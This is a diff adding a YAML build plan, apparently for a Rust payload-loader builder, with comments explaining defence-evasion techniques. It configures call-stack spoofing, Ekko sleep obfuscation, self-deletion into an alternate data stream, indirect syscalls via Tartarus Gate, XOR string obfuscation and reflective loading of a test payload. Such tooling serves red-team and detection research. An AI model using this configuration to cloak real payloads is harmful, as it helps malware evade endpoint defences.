@@ -1,0 +1,49 @@
+# On-disk and in-memory evasion: preparations that act on the *running image* or
+# the syscall layer, before a reflective payload.
+#
+#   cargo run -- build examples/plans/evasion.yaml
+#   .\dist\evasion.exe
+#
+#   - `stack_spoofing` (x64) replaces the syscall trampoline and fabricates the
+#     top of the call stack for every indirect syscall, so a stack walk during
+#     the call sees ntdll return addresses. It requires `syscalls.mode: indirect`.
+#   - `sleep_obfuscation` encrypts the image region during a timer-driven sleep
+#     (ekko), so a memory scanner sees ciphertext while the loader dwells.
+#   - `self_deletion` (`rename_ads`) moves the running image into an alternate
+#     data stream of its own path, leaving a 0-byte file at the original path.
+#
+# These all act on the loader's own image, so a `kind: dll` build rejects them
+# (in a DLL the image is the host's, not the loader's).
+
+schema: 6
+name: evasion
+
+build:
+  payloads:
+    payload:
+      source: ./examples/payloads/test_payload.exe
+  stub:
+    syscalls:
+      mode: indirect
+      resolver: tartarus_gate
+    strings:
+      strategy: xor
+  output:
+    path: ./dist/evasion.exe
+
+runtime:
+  - technique: stack_spoofing
+    params:
+      decoy_bytes: 4096
+
+  - technique: sleep_obfuscation
+    params:
+      variant: ekko
+      sleep_ms: 5000
+      encrypt_regions: [payload]
+
+  - technique: self_deletion
+    params:
+      mode: rename_ads
+
+  - technique: reflective_loading
